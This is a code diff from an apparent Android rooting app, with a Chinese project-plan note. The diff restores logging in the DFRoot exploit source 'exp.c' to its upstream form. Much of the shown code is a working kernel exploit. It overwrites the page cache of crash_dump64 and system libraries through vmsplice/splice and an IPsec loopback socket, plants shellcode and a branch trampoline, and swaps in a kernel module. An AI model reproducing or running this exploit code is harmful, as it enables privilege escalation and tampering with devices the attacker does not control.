@@ -1,0 +1,460 @@
+--- BASELINE_FILE/app/src/main/cpp/43284glued/CMakeLists.txt
++++ MODIFIED_FILE/app/src/main/cpp/43284glued/CMakeLists.txt
+@@ -36,7 +36,7 @@
+ # AGP only packages lib*.so, so the executable is named libdfroot.so and lands
+ # in the APK's native lib dir. The app execs it from nativeLibraryDir, which is
+ # executable (app data dir is not).
+-add_executable(dfroot exp.c libcxx.S elf_parser.c df_log.c)
++add_executable(dfroot exp.c libcxx.S elf_parser.c)
+ add_dependencies(dfroot splicehelper_bin)
+ set_target_properties(dfroot PROPERTIES
+     PREFIX "lib"
+--- BASELINE_FILE/app/src/main/cpp/43284glued/exp.c
++++ MODIFIED_FILE/app/src/main/cpp/43284glued/exp.c
+@@ -16,7 +16,6 @@
+ #include <netinet/in.h>
+ #include <arpa/inet.h>
+ #include "aes256.h"
+-#include "df_log.h"
+ 
+ #define eos(s) (s + strlen(s))
+ 
+@@ -62,7 +61,7 @@
+     char offstr[24];
+     snprintf(offstr, sizeof(offstr), "%ld", (long)offset);
+     int pid = (int)syscall(__NR_clone, SIGCHLD | CLONE_VFORK | CLONE_VM, 0, 0, 0, 0);
+-    if (pid < 0) { DF_LOGI("vfork failed: %s\n", strerror(errno)); return -1; }
++    if (pid < 0) { printf("vfork failed: %s\n", strerror(errno)); return -1; }
+     if (pid == 0) {
+         if (write_fd != target_fd && dup2(write_fd, target_fd) < 0) _exit(1);
+         if (mode)
+@@ -80,7 +79,7 @@
+  */
+ static int read_vendor_content(off_t offset, uint8_t buf[16]) {
+     int rdpipe[2];
+-    if (pipe(rdpipe) < 0) { DF_LOGI("pipe failed: %s\n", strerror(errno)); return -1; }
++    if (pipe(rdpipe) < 0) { printf("pipe failed: %s\n", strerror(errno)); return -1; }
+ 
+     int status = spawn_crash_dump(offset, rdpipe[1], 0, "r");
+     close(rdpipe[1]);
+@@ -99,13 +98,13 @@
+             };
+             int ec = WEXITSTATUS(status);
+             const char *meaning = (ec < 4) ? exit_meanings[ec] : "unknown";
+-            DF_LOGI("read_vendor at 0x%lx got %d bytes: %s\n",
++            printf("read_vendor at 0x%lx got %d bytes: %s\n",
+                      (long)offset, n, meaning);
+         } else if (WIFSIGNALED(status))
+-            DF_LOGI("read_vendor at 0x%lx got %d bytes: signal %d\n",
++            printf("read_vendor at 0x%lx got %d bytes: signal %d\n",
+                      (long)offset, n, WTERMSIG(status));
+         else
+-            DF_LOGI("read_vendor at 0x%lx got %d bytes: status 0x%x\n",
++            printf("read_vendor at 0x%lx got %d bytes: status 0x%x\n",
+                      (long)offset, n, status);
+         return -1;
+     }
+@@ -127,25 +126,25 @@
+ 
+     struct iovec iov = {.iov_base = hdr, .iov_len = 24};
+     if (vmsplice(pipe_wr, &iov, 1, SPLICE_F_GIFT) != 24) {
+-        DF_LOGI("vmsplice hdr failed: %s\n", strerror(errno)); return -1;
++        printf("vmsplice hdr failed: %s\n", strerror(errno)); return -1;
+     }
+ 
+     if (use_helper) {
+         int st = spawn_crash_dump(offset, pipe_wr, 1, NULL);
+         if (st < 0) return -1;
+         if (!(WIFEXITED(st) && WEXITSTATUS(st) == 0)) {
+-            DF_LOGI("splice helper failed status=0x%x\n", st);
++            printf("splice helper failed status=0x%x\n", st);
+             return -1;
+         }
+     } else {
+         off_t off = offset;
+         if (splice(file_fd, &off, pipe_wr, NULL, 16, SPLICE_F_MOVE) != 16) {
+-            DF_LOGI("splice file failed: %s\n", strerror(errno)); return -1;
++            printf("splice file failed: %s\n", strerror(errno)); return -1;
+         }
+     }
+ 
+     ssize_t s = splice(pipe_rd, NULL, sk_send, NULL, 40, 0);
+-    if (s != 40) { DF_LOGI("splice pipe->udp: %zd expected 40\n", s); return -1; }
++    if (s != 40) { printf("splice pipe->udp: %zd expected 40\n", s); return -1; }
+     return 0;
+ }
+ 
+@@ -157,14 +156,13 @@
+  */
+ static int patch_file_cbc(const char *path, const char *payload, size_t len,
+                            size_t foff, int use_helper) {
+-    DF_LOGV("patch_file_cbc.begin path=%s len=%zu foff=0x%zx helper=%d", path, len, foff, use_helper);
+     if (len % 16 != 0) {
+-        DF_LOGI("patch_file_cbc: len=%zu not multiple of 16\n", len);
++        printf("patch_file_cbc: len=%zu not multiple of 16\n", len);
+         return -1;
+     }
+ 
+     int sk_send = socket(AF_INET, SOCK_DGRAM, 0);
+-    if (sk_send < 0) { DF_LOGI("socket failed: %s\n", strerror(errno)); return -1; }
++    if (sk_send < 0) { printf("socket failed: %s\n", strerror(errno)); return -1; }
+     int opt = 1;
+     setsockopt(sk_send, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
+     struct sockaddr_in src = {
+@@ -173,14 +171,14 @@
+         .sin_addr   = {.s_addr = htonl(INADDR_LOOPBACK)},
+     };
+     if (bind(sk_send, (struct sockaddr *)&src, sizeof(src)) < 0)
+-        DF_LOGI("bind port %d failed: %s\n", g_sender_port, strerror(errno));
++        printf("bind port %d failed: %s\n", g_sender_port, strerror(errno));
+     struct sockaddr_in dst = {
+         .sin_family = AF_INET,
+         .sin_port   = htons((uint16_t)g_encap_port),
+         .sin_addr   = {.s_addr = htonl(INADDR_LOOPBACK)},
+     };
+     if (connect(sk_send, (struct sockaddr *)&dst, sizeof(dst)) < 0) {
+-        DF_LOGI("connect failed: %s\n", strerror(errno));
++        printf("connect failed: %s\n", strerror(errno));
+         close(sk_send); return -1;
+     }
+ 
+@@ -188,14 +186,14 @@
+     if (!use_helper) {
+         file_fd = open(path, O_RDONLY);
+         if (file_fd < 0) {
+-            DF_LOGI("open %s failed: %s\n", path, strerror(errno));
++            printf("open %s failed: %s\n", path, strerror(errno));
+             close(sk_send); return -1;
+         }
+     }
+ 
+     int pfd[2];
+     if (pipe(pfd) < 0) {
+-        DF_LOGI("pipe failed: %s\n", strerror(errno));
++        printf("pipe failed: %s\n", strerror(errno));
+         if (!use_helper) close(file_fd);
+         close(sk_send);
+         return -1;
+@@ -212,7 +210,7 @@
+             }
+         } else {
+             if (pread(file_fd, old_content, 16, off) != 16) {
+-                DF_LOGI("pread at 0x%lx failed: %s\n", (long)off, strerror(errno));
++                printf("pread at 0x%lx failed: %s\n", (long)off, strerror(errno));
+                 rc = -1; break;
+             }
+         }
+@@ -224,7 +222,7 @@
+         compute_iv(old_content, desired, iv);
+ 
+         if (do_one_write_cbc(pfd[0], pfd[1], sk_send, file_fd, off, iv, use_helper) < 0) {
+-            DF_LOGI("write #%zu at 0x%lx failed\n", i, (long)off);
++            printf("write #%zu at 0x%lx failed\n", i, (long)off);
+             rc = -1; break;
+         }
+     }
+@@ -232,10 +230,7 @@
+     close(pfd[0]); close(pfd[1]);
+     if (!use_helper) close(file_fd);
+     close(sk_send);
+-    if (rc == 0) {
+-        DF_LOGD("patch_file_cbc.done path=%s blocks=%zu", path, len / 16);
+-        DF_LOGI("patched %zu bytes to %s+0x%zx\n", len, path, foff);
+-    }
++    if (rc == 0) printf("patched %zu bytes to %s+0x%zx\n", len, path, foff);
+     return rc;
+ }
+ 
+@@ -311,7 +306,7 @@
+     if (sscanf(u.release, "%d.%d", major, minor) != 2) return -1;
+     const char *m = strstr(u.release, "android");
+     if (!m) {
+-        DF_LOGI("uname -r is missing Android version, trying getprop\n");
++        printf("uname -r is missing Android version, trying getprop\n");
+ 
+         char vendor_ver[5];
+         char release[15];
+@@ -340,14 +335,13 @@
+ 
+ /* Write splicehelper into crash_dump64 page cache. */
+ static int patch_helper(void) {
+-    DF_LOGV("patch_helper.begin");
+     size_t len;
+     char *buf = pad16(splice_helper_start,
+                       (size_t)(splice_helper_end - splice_helper_start), &len);
+-    if (!buf) { DF_LOGI("patch: crash_dump64 - pad16 alloc failed\n"); return -1; }
+-    DF_LOGI("patch: crash_dump64 <- splicehelper (%zu bytes)\n", len);
++    if (!buf) { printf("patch: crash_dump64 - pad16 alloc failed\n"); return -1; }
++    printf("patch: crash_dump64 <- splicehelper (%zu bytes)\n", len);
+     int ret = patch_file_cbc(kCrashDump, buf, len, 0, 0);
+-    if (ret) { free(buf); DF_LOGI("patch: crash_dump64 patch failed: %d\n", ret); return ret; }
++    if (ret) { free(buf); printf("patch: crash_dump64 patch failed: %d\n", ret); return ret; }
+ 
+     uint8_t verify[16];
+     int vfd = open(kCrashDump, O_RDONLY);
+@@ -355,49 +349,45 @@
+         ssize_t n = pread(vfd, verify, 16, 16);
+         close(vfd);
+         if (n == 16 && memcmp(verify, buf + 16, 16) != 0) {
+-            DF_LOGI("patch: crash_dump64 verification failed\n");
+-            DF_LOGI("patch: DEVICE NOT VULNERABLE\n");
++            printf("patch: crash_dump64 verification failed\n");
++            printf("patch: DEVICE NOT VULNERABLE\n");
+             free(buf);
+             return -1;
+         }
+     }
+     free(buf);
+-    DF_LOGD("patch_helper.done");
+     return 0;
+ }
+ 
+ static int patch_ko(void) {
+-    DF_LOGV("patch_ko.begin");
+     int andr = 0, major = 0, minor = 0;
+     if (read_device_versions(&andr, &major, &minor) != 0) {
+-        DF_LOGI("Can't parse kernel version - Non-GKI device? (unsupported)\n"); return 1;
++        printf("Can't parse kernel version - Non-GKI device? (unsupported)\n"); return 1;
+     }
+     const struct KoImage *ko = select_ko_image(andr, major, minor);
+     if (!ko) {
+-        DF_LOGI("Unsupported kernel %d.%d android %d\n", major, minor, andr); return 1;
+-    }
+-    DF_LOGI("Using KMI: android%d-%d.%d\n",
++        printf("Unsupported kernel %d.%d android %d\n", major, minor, andr); return 1;
++    }
++    printf("Using KMI: android%d-%d.%d\n",
+              ko->android_release, ko->kver_major, ko->kver_minor);
+ 
+     size_t len;
+     char *buf = pad16(ko->start, (size_t)(ko->end - ko->start), &len);
+-    if (!buf) { DF_LOGI("patch: %s - pad16 alloc failed\n", libcxx_ko_target); return -1; }
+-    DF_LOGI("patch: %s <- dfroot.ko (%zu bytes)\n", libcxx_ko_target, len);
++    if (!buf) { printf("patch: %s - pad16 alloc failed\n", libcxx_ko_target); return -1; }
++    printf("patch: %s <- dfroot.ko (%zu bytes)\n", libcxx_ko_target, len);
+     int ret = patch_file_cbc(libcxx_ko_target, buf, len, 0, 1);
+     free(buf);
+-    if (ret) DF_LOGW("LKM patch failed: %s", libcxx_ko_target);
+-    else DF_LOGD("patch_ko.done target=%s", libcxx_ko_target);
++    if (ret) printf("patch: %s patch failed: %d\n", libcxx_ko_target, ret);
+     return ret;
+ }
+ 
+ static void cleanup(void) {
+-    DF_LOGV("cleanup.begin");
+     if (!g_libcxx_r.valid) return;
+-    DF_LOGI("\n=== cleanup ===\n");
+-    DF_LOGI("restoring trampoline in %s\n", g_libcxx_r.lib);
++    printf("\n=== cleanup ===\n");
++    printf("restoring trampoline in %s\n", g_libcxx_r.lib);
+     patch_file_cbc(g_libcxx_r.lib, (char *)g_libcxx_r.tramp_orig, 16,
+                    (size_t)g_libcxx_r.tramp_aligned, 0);
+-    DF_LOGI("restoring shellcode in %s\n", g_libcxx_r.lib);
++    printf("restoring shellcode in %s\n", g_libcxx_r.lib);
+     patch_file_cbc(g_libcxx_r.lib, g_libcxx_r.shell_orig, g_libcxx_r.shell_padded,
+                    (size_t)g_libcxx_r.shell_off, 0);
+ }
+@@ -413,24 +403,24 @@
+     uint32_t start_delta = (uint32_t)(stage_start - stage_data);
+ 
+     size_t padded; char *buf = pad16(stage_data, stage_len, &padded);
+-    if (!buf) { DF_LOGI("patch: %s - pad16 alloc failed\n", lib); return -1; }
++    if (!buf) { printf("patch: %s - pad16 alloc failed\n", lib); return -1; }
+ 
+     if (padded > sizeof(restore->shell_orig)) {
+-        DF_LOGI("shellcode too large to save (%zu)\n", padded);
++        printf("shellcode too large to save (%zu)\n", padded);
+         free(buf); return -1;
+     }
+ 
+     uint64_t hook_off, shell_off; uint32_t first_insn;
+-    DF_LOGI("Finding symbol offsets for %s:\n", lib);
++    printf("Finding symbol offsets for %s:\n", lib);
+     if (find_hook_target(lib, sym, &hook_off, &shell_off, &first_insn, padded)) {
+-        DF_LOGI("failed to find offsets for %s\n", lib); free(buf); return 1;
+-    }
+-    DF_LOGI("Found: hook=0x%lx shellcode=0x%lx len=%u\n", hook_off, shell_off, stage_len);
++        printf("failed to find offsets for %s\n", lib); free(buf); return 1;
++    }
++    printf("Found: hook=0x%lx shellcode=0x%lx len=%u\n", hook_off, shell_off, stage_len);
+ 
+     uint32_t hook_insn = BRANCH | (((shell_off + start_delta - hook_off) >> 2) & 0x3ffffff);
+ 
+     if (first_insn == hook_insn) {
+-        DF_LOGI("%s already patched\n", lib); free(buf); return 0;
++        printf("%s already patched\n", lib); free(buf); return 0;
+     }
+     uint32_t jmpback = BRANCH |
+         (((hook_off + 4) - (shell_off + stage_len - 4)) >> 2 & 0x3ffffff);
+@@ -439,11 +429,11 @@
+ 
+     uint64_t aligned = hook_off & ~(uint64_t)15;
+     int fd = open(lib, O_RDONLY);
+-    if (fd < 0) { DF_LOGI("open %s failed: %s\n", lib, strerror(errno)); free(buf); return -1; }
++    if (fd < 0) { printf("open %s failed: %s\n", lib, strerror(errno)); free(buf); return -1; }
+     int ok = pread(fd, restore->shell_orig, padded,  (off_t)shell_off) == (ssize_t)padded
+           && pread(fd, restore->tramp_orig, 16,       (off_t)aligned)  == 16;
+     close(fd);
+-    if (!ok) { DF_LOGI("pread %s save failed\n", lib); free(buf); return -1; }
++    if (!ok) { printf("pread %s save failed\n", lib); free(buf); return -1; }
+ 
+     restore->lib           = lib;
+     restore->shell_off     = shell_off;
+@@ -451,27 +441,25 @@
+     restore->tramp_aligned = aligned;
+     restore->valid         = 1;
+ 
+-    DF_LOGI("patch: %s <- shellcode (%zu bytes)\n", lib, padded);
++    printf("patch: %s <- shellcode (%zu bytes)\n", lib, padded);
+     int ret = patch_file_cbc(lib, buf, padded, shell_off, 0);
+     free(buf);
+-    if (ret) { DF_LOGI("patch: %s shellcode patch failed: %d\n", lib, ret); return ret; }
++    if (ret) { printf("patch: %s shellcode patch failed: %d\n", lib, ret); return ret; }
+ 
+     int pos = (int)(hook_off & 15);
+     uint8_t blk[16];
+     memcpy(blk, restore->tramp_orig, 16);
+     memcpy(&blk[pos], &hook_insn, 4);
+-    DF_LOGI("patch: %s <- trampoline (16 bytes)\n", lib);
++    printf("patch: %s <- trampoline (16 bytes)\n", lib);
+     int ret2 = patch_file_cbc(lib, (char *)blk, 16, (size_t)aligned, 0);
+-    if (ret2) DF_LOGW("trampoline patch failed: %s", lib);
+-    else DF_LOGD("patch_hook.done lib=%s hook=0x%lx shell=0x%lx", lib, hook_off, shell_off);
++    if (ret2) printf("patch: %s trampoline patch failed: %d\n", lib, ret2);
+     return ret2;
+ }
+ 
+ static int createOrphanProcess(void) {
+-    DF_LOGV("createOrphanProcess.begin");
+-    DF_LOGI("Triggering hook...\n");
++    printf("Triggering hook...\n");
+     int pid = fork();
+-    if (pid < 0) { DF_LOGI("Failed to create orphan: %s\n", strerror(errno)); return -1; }
++    if (pid < 0) { printf("Failed to create orphan: %s\n", strerror(errno)); return -1; }
+     if (pid == 0) {
+         int pid2 = fork();
+         if (pid2 == 0) { sleep(1); _exit(0); }
+@@ -542,16 +530,15 @@
+     strncpy(libcxx_ko_target, ko_target, 63);
+     libcxx_ko_target[63] = '\0';
+ 
+-    DF_LOGI("=== setup ===\n");
+-    DF_LOGI("found ko_target: %s\n", ko_target);
+-    DF_LOGI("encap port: %d\n", encap_port);
+-    DF_LOGI("spi: 0x%x\n", spi);
++    printf("=== setup ===\n");
++    printf("found ko_target: %s\n", ko_target);
++    printf("encap port: %d\n", encap_port);
++    printf("spi: 0x%x\n", spi);
+     return 0;
+ }
+ 
+ static int exploit(void) {
+-    DF_LOGD("exploit.begin");
+-    DF_LOGI("\n=== exploit (patching files) ===\n");
++    printf("\n=== exploit (patching files) ===\n");
+ 
+     int rc = 3;
+     if (patch_helper()) goto done;
+@@ -564,7 +551,7 @@
+     rc = 2;
+     usleep(500000);
+     
+-    DF_LOGI("\n=== init  ===\n");
++    printf("\n=== init  ===\n");
+     createOrphanProcess();
+ 
+     static const struct {
+@@ -593,14 +580,14 @@
+         for (size_t j = 0; j < sizeof(markers)/sizeof(markers[0]); j++) {
+             if (!seen[j] && access(markers[j].path, F_OK) == 0) {
+                 seen[j] = 1;
+-                DF_LOGI("%s\n", markers[j].msg);
++                printf("%s\n", markers[j].msg);
+                 if (markers[j].rc >= 0) { rc = markers[j].rc; goto done; }
+             }
+         }
+     }
+-    DF_LOGI("timeout: ERROR - check logcat & dmesg\n");
++    printf("timeout: ERROR - check logcat & dmesg\n");
+ done:
+-    if (rc == 3) DF_LOGI("patch: ERROR - failed to patch files\n");
++    if (rc == 3) printf("patch: ERROR - failed to patch files\n");
+     return rc;
+ }
+ 
+--- BASELINE_FILE/app/src/main/cpp/43284glued/df_log.c
++++ /dev/null
+@@ -1,24 +0,0 @@
+-#include "df_log.h"
+-
+-#include <stdio.h>
+-#include <string.h>
+-
+-static df_log_level g_min = DF_LOG_INFO;
+-
+-void df_log_set_min(df_log_level level) {
+-    g_min = level;
+-}
+-
+-void df_log_write(df_log_level level, const char *fmt, ...) {
+-    if ((int)level < (int)g_min) return;
+-    flockfile(stdout);
+-    fprintf(stdout, "<%c> [NATIVE] ", (char)level);
+-    va_list args;
+-    va_start(args, fmt);
+-    vfprintf(stdout, fmt, args);
+-    va_end(args);
+-    const size_t n = strlen(fmt);
+-    if (n == 0 || fmt[n - 1] != '\n') fputc('\n', stdout);
+-    fflush(stdout);
+-    funlockfile(stdout);
+-}
+--- BASELINE_FILE/app/src/main/cpp/43284glued/df_log.h
++++ /dev/null
+@@ -1,25 +0,0 @@
+-#pragma once
+-
+-#include <stdarg.h>
+-
+-/** GhostLock-compatible levels: V/D/I/W/E. */
+-typedef enum df_log_level {
+-    DF_LOG_VERBOSE = 'V',
+-    DF_LOG_DEBUG = 'D',
+-    DF_LOG_INFO = 'I',
+-    DF_LOG_WARN = 'W',
+-    DF_LOG_ERROR = 'E',
+-} df_log_level;
+-
+-/** Set minimum level; default I. */
+-void df_log_set_min(df_log_level level);
+-
+-/** Write one level-tagged line to stdout (captured by ExploitRunner). */
+-void df_log_write(df_log_level level, const char *fmt, ...)
+-    __attribute__((format(printf, 2, 3)));
+-
+-#define DF_LOGV(...) df_log_write(DF_LOG_VERBOSE, __VA_ARGS__)
+-#define DF_LOGD(...) df_log_write(DF_LOG_DEBUG, __VA_ARGS__)
+-#define DF_LOGI(...) df_log_write(DF_LOG_INFO, __VA_ARGS__)
+-#define DF_LOGW(...) df_log_write(DF_LOG_WARN, __VA_ARGS__)
+-#define DF_LOGE(...) df_log_write(DF_LOG_ERROR, __VA_ARGS__)
+--- BASELINE_FILE/docs/plan/exec-glue-plan.md
++++ MODIFIED_FILE/docs/plan/exec-glue-plan.md
+@@ -232,3 +232,17 @@
+ - 命令 `adb -s adb-QV770MFGJ1-XxNlpb._adb-tls-connect._tcp shell am instrument -w -e class com.ghostlock.app.backend.cve43284glued.AndroidIpSecRuntimeSmokeTest com.ghostlock.app.test/androidx.test.runner.AndroidJUnitRunner` 返回 `OK (1 test)` / exit 0：只在 App UID 建立、校验并逆序关闭 IpSec runtime；测试不调用 `ExecutableBackendProcess.start()`、不运行任何漏洞 ELF。测试 APK随后卸载。
+ - A301SO 上 Shizuku manager 包已安装，但没有运行中的 Shizuku/UserService 进程；本次设备验证覆盖当前可用的 App-domain route，Shizuku-host runtime 仍未真机验证。原版 UI 的 AVD selector/profile card 证据保存在 `transaction-a301so-deploy/avd-main.png`。
+ - 当前实现消除了 43284 参数/IpSec runtime 这一阻断，但完整部署仍被 43499 FinishScript/O_TRUNC parity、两上游 fork/setsid descendants 的取消/断连归属，以及两条 exec launcher 的无副作用进程 fixture smoke 阻断；不运行漏洞 ELF。
++
++### rev3 批次 3：恢复 DFRoot 上游 C 原文（2026-10-29）
++
++- 复核发现 `app/src/main/cpp/43284glued/exp.c` 曾为接入通用日志而引入 `df_log.h` 并替换上游 `printf` 调用，不符合“DFRoot C 代码不做修改”的原始要求。
++- 已按固定上游快照 `/tmp/DFRoot-upstream-inspect`（commit `49e992ef3c9f7ec03c8efea6e3cf552f7ec6a347`）恢复 `exp.c` 原始字节；移除仅供 Glued 43284 使用的 `df_log.c/.h`，其输出由既有 exec stdout 捕获进入通用日志；CMake 只保留可执行文件打包所需适配。
++- 验证结果：`exp.c` 与 pinned DFRoot `app/src/main/jni/exp.c` 逐字节一致（`True`，SHA-256 `afdd68cb6b07fa9b04f93c7d4bd9f8ce0333f4dd2265416959cf9c630d55ac39`，22,927 bytes）；`./gradlew :app:testDebugUnitTest --no-daemon --console=plain` 成功，build/test XML 为 410 tests / 0 failures / 0 errors / 0 skipped；`./gradlew :app:assembleDebug :app:assembleDebugAndroidTest --no-daemon --console=plain` 成功（77 actionable tasks）。
++- AVD/A301SO：当前 debug APK SHA-256 `82f117e974217587d769009cce0f54eb542e4536625e320a9d963394035559b7` 已分别安装到 AVD 与 A301SO；两端 `base.apk` 均与构建产物逐字节一致。A301SO（Android 15）`AndroidIpSecRuntimeSmokeTest` 返回 `OK (1 test)`，随后测试 APK 卸载；没有漏洞 ELF 进程。AVD Paths 页确认两个 Glued 选项可选，原版/Custom 灰显；43284 卡无 profile 配置，43499 卡提供内置 profile 与 `Import .conf`。
++- 尚存 UI 文案脱轨：AVD Home XML 仍显示 `GhostLock is running with demo data; chain execution is not wired yet.`，与当前已接线的 Glued exec 路径不一致；本批只记录，未改 UI 文案。
++- 该修改只恢复上游原文与 CMake source list，不运行漏洞 ELF；批次 3 的 IpSec smoke 直接验证 App-domain runtime。随后独立的 Shizuku probe 绑定 UserService 并验证错误输入在 spawn 前被拒绝，仍未启动 Glued ELF。
++
++#### Shizuku route probe 复核（2026-10-29）
++
++- 更新：A301SO 此时 `shizuku_server` 正在运行；instrumentation `ShizukuRouteProbeTest` 共 2 tests，实测 `binder=true permission=true route=SHIZUKU preflight=[]`；通过 Shizuku UserService/AIDL 发送空 Bundle 后收到 `exec:host:argv-missing`，测试随后 `disconnect(remove=true)`。此前批次 2 的“Shizuku 未运行”只描述其当时观测状态，不能用于当前路由判断。
++- 已验证 Shizuku binder/授权/UID/SELinux preflight、UserService bind、AIDL dispatch 及 host fail-closed prepare；该探针没有启动 Glued ELF。A301SO 的下一次 Glued run 会选择 Shizuku；成功 prepare/start、子进程终态/回收及无副作用子进程执行链仍未端到端实测。Shizuku 选中后出错不得 fallback 到 App 子进程。
